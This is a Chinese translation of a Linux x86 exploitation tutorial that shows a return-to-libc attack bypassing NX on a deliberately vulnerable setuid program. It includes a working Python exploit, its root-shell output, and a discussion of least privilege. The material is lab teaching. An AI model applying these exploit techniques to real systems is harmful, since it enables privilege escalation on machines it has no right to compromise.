CSysSec注： 本系列文章译自安全自由工作者Sploitfun的漏洞利用系列博客，从经典栈缓冲区漏洞利用堆漏洞利用，循序渐进，是初学者不可多得的好材料，本系列所有文章涉及的源码可以在这里找到。CSysSec计划在原基础上不断添加相关漏洞利用技术以及相应的Mitigation方法，欢迎推荐或自荐文章。  
转载本文请务必注明，文章出处：《[Linux(X86)漏洞利用系列-Return-to-libc绕过NX](http://www.csyssec.org/20161231/returntolibc/)》与作者信息：CSysSec出品  


VM Setup: Ubuntu 12.04 (x86)  

在前面的文章中，我们可以了解到，攻击者可以：  

将shellcode拷贝到栈中，再跳转到shellcode  
来达到成功利用漏洞代码的目的。 

因此，为了阻止攻击者的行为，安全研究人员开始利用“NX”比特位来缓解漏洞利用方法(exploit mitigation)。  

## 什么是NX比特位

这种漏洞利用缓解方法将指定内存区域设置为不可执行，并将可执行的区域设置为不可写。举个例子：数据段、栈和堆设置为不可执行，text段设置为不可写（数据执行保护策略(Data Execution Prevention, DEP)）。  

设置NX位后，经典的栈缓冲区溢出无法利用其漏洞。那是因为，在经典的方法中，shellcode被拷贝到栈中，返回地址指向shellcode。然而，现在的情况是栈被设置位不可执行，漏洞利用(exploit)就会失败。 当然，这种缓解(mitigation)技术也不是完全安全的，这篇文章就来看看我们是如何绕过NX比特位的!!!  

漏洞代码： 下面这份代码基于前文中漏洞代码作了一点修改，我会在后文中讲述修改的必要性。  

``` c
 //vuln.c
#include <stdio.h>
#include <string.h>
int main(int argc, char* argv[]) {
 char buf[256]; /* [1] */ 
 strcpy(buf,argv[1]); /* [2] */
 printf("%s\n",buf); /* [3] */
 fflush(stdout);  /* [4] */
 return 0;
}
```
编译命令: 

``` bash
#echo 0 > /proc/sys/kernel/randomize_va_space
$gcc -g -fno-stack-protector -o vuln vuln.c
$sudo chown root vuln
$sudo chgrp root vuln
$sudo chmod +s vuln
```
注意: “-z exexstack”参数并没有传递给gcc，因此这时栈是不可执行的(Non eXecutable)，可以通过下述方法来验证：  

``` bash
$ readelf -l vuln
...
Program Headers:
 Type      Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
 PHDR      0x000034 0x08048034 0x08048034 0x00120 0x00120 R E 0x4
 INTERP    0x000154 0x08048154 0x08048154 0x00013 0x00013 R 0x1
 [Requesting program interpreter: /lib/ld-linux.so.2]
 LOAD      0x000000 0x08048000 0x08048000 0x00678 0x00678 R E 0x1000
 LOAD      0x000f14 0x08049f14 0x08049f14 0x00108 0x00118 RW 0x1000
 DYNAMIC   0x000f28 0x08049f28 0x08049f28 0x000c8 0x000c8 RW 0x4
 NOTE      0x000168 0x08048168 0x08048168 0x00044 0x00044 R 0x4
 ...
 GNU_STACK 0x000000 0x00000000 0x00000000 0x00000 0x00000 RW 0x4
 GNU_RELRO 0x000f14 0x08049f14 0x08049f14 0x000ec 0x000ec R 0x1
$
```
栈中只有RW标志位，并没有E标志位！ 

## 如何绕过NX比特位做到任意代码执行  

可以通过“return-to-libc”技术来绕过NX比特位。这里，返回地址被一种特殊的libc函数地址(而不是含有shellcode代码的栈地址)覆盖。举个例子，如果攻击者想触发一个shell, 他会利用system()地址来覆盖返回地址并设置好system()在栈中需要的必要参数，以便能成功调用system()。  

之前我们已经反汇编并画出了漏洞代码的栈布局，现在开始写个漏洞利用代码来绕过NX比特位吧！  

漏洞利用代码

``` python
#exp.py
#!/usr/bin/env python
import struct
from subprocess import call
#Since ALSR is disabled, libc base address would remain constant and hence we can easily find the function address we want by adding the offset to it. 
#For example system address = libc base address + system offset
#where 
       #libc base address = 0xb7e22000 (Constant address, it can also be obtained from cat /proc//maps)
       #system offset     = 0x0003f060 (obtained from "readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system")
system = 0xb7e61060        #0xb7e2000+0x0003f060
exit = 0xb7e54be0          #0xb7e2000+0x00032be0
#system_arg points to 'sh' substring of 'fflush' string. 
#To spawn a shell, system argument should be 'sh' and hence this is the reason for adding line [4] in vuln.c. 
#But incase there is no 'sh' in vulnerable binary, we can take the other approach of pushing 'sh' string at the end of user input!!
system_arg = 0x804827d     #(obtained from hexdump output of the binary，文件字符串地址+program header加载到内存时固定偏移地址)
#endianess conversion
def conv(num):
 return struct.pack("<I",num)
buf = "A" * 268
buf += conv(system)
buf += conv(exit)
buf += conv(system_arg)
print "Calling vulnerable program"
call(["./vuln", buf])
```
gdb调试程序，在main出设置断点并运行，程序会在main的入口处停下，然后执行p system 和 p exit 就能将system和exit在内存中的地址打印出来。  
执行上述漏洞利用代码，可以得到一个具有root权限的shell,如下图所示：  

``` bash
$ python exp.py 
Calling vulnerable program
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`���K��}�
# id
uid=1000(sploitfun) gid=1000(sploitfun) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare),1000(sploitfun)
# exit
$
```
太棒了，我们拿到了root shell! 但在实际应用程序中，root setuid 程序设置了最低权限准则，获取root shell并没那么容易！  
我们构造了一个假的调用堆栈，即把 exit() 的函数地址当作 system() 函数调用的返回地址。  

## x86_64 平台攻击实验
对于本地攻击，我们可以将“/bin/sh”声明为一个环境变量，这样，retlib运行时就能找到这个字符串的首地址。具体步骤如下：  
```
export MYSHELL=/bin/sh
gcc –o getenvaddr getenvaddr.c
./getenvaddr MYSHELL ./retlib
```
其中 getenvaddr.c 的代码如下  
``` c
int main(int argc, char **argv)
{
	char *env=0;
	if(argc < 3){
		printf(“Usage: %s<environment var> <target program
		name>\n”, argv[0]); return 1;
	}
	env=getenv(argv[1]);
	env += (strlen(argv[0]) - strlen(argv[2])) * 2;
	printf(“%s will be at %p\n”, argv[1], env); return 0;
}
```

在 x86_64 平台的实验采用了与 x86 平台类似的方式。我们为假 system()函数构造了一个假的栈帧内容，并让其执行特定的命令“/bin/sh”，但攻击并没有成功。这是因为在 x86_64 的 CPU 平台中程序执行时参数不是通过栈传递的而是通过寄存器，而 return-into-libc 需要将参数通过栈来传递。因此 system()函数始终不能获得正确的参数。为了验证这一点，我们通过 gdb 跟踪进入 system()后的过程。
```
$gdb retlibc
......
(gdb)p/x $rdi
$1=0x7fffffffe012
(gdb)set $rdi=0x7fffffffeddf
(gdb)c
continuing.
$pwd
/home/fmliu/paper
$
```
system()函数通过 rdi 寄存器获得参数“/bin/sh”的地址，因此在 gdb 中我们重新设定 rdi 寄存器的值为字符串地址后，攻击就可以实施了。因此，说明攻击确实是仅仅因为参数通过寄存器而非栈传递而导致了失败。  

## 什么是最低权限准则

这种技术允许root setuid程序只有在需要的情况下才能获取root权限。也就是说，在需要时，root setuid程序拿到root 权限，不需要时就会丢弃已获取的权限。root setuid一般会在接收用户输入之前会丢弃root权限。因此，尽管用户输入是恶意的，攻击者也无法后去root shell。 举个例子，下面的漏洞代码不允许攻击者获取root shell。  

``` c
//vuln_priv.c
#include <stdio.h>
#include <string.h>
int main(int argc, char* argv[]) {
 char buf[256];
 seteuid(getuid()); /* Temporarily drop privileges */ 
 strcpy(buf,argv[1]);
 printf("%s\n",buf);
 fflush(stdout);
 return 0;
}
```
对于上述漏洞程序，当我们执行下面的漏洞利用代码时，无法获取root shell。  

``` python
#exp_priv.py
#!/usr/bin/env python
import struct
from subprocess import call
system = 0xb7e61060
exit = 0xb7e54be0
system_arg = 0x804829d
#endianess conversion
def conv(num):
 return struct.pack("<I",num)
buf = "A" * 268
buf += conv(system)
buf += conv(exit)
buf += conv(system_arg)
print "Calling vulnerable program"
call(["./vuln_priv", buf])
```
注意：exp_priv.py对exp.py稍作了一点修改！仅仅调整了system_arg变量  

``` bash
$ python exp_priv.py 
Calling vulnerable program
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`���K川�
$ id
uid=1000(sploitfun) gid=1000(sploitfun) egid=0(root) groups=1000(sploitfun),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare)
$ rm /bin/ls
rm: remove write-protected regular file `/bin/ls'? y
rm: cannot remove `/bin/ls': Permission denied
$ exit
$
```
到这里就完事了吗？那该如何对应用最低权限准则的root setuid程序进行漏洞利用呢？  

## root setuid程序漏洞利用

针对漏洞代码(vuln_priv)，漏洞利用程序(exp_priv.py)调用system()再紧接着调用exit()还不足以获取root shell。 但如果能修改一下漏洞利用程序(exp_priv.py)，以下面的顺序调用libc函数：  
```
setuid(0)
system(“sh”)
exit()
```
这样一来我们就能获取root shell。 这种技术叫做return-to-libc链接(chaining)，将会在下一篇中讨论。 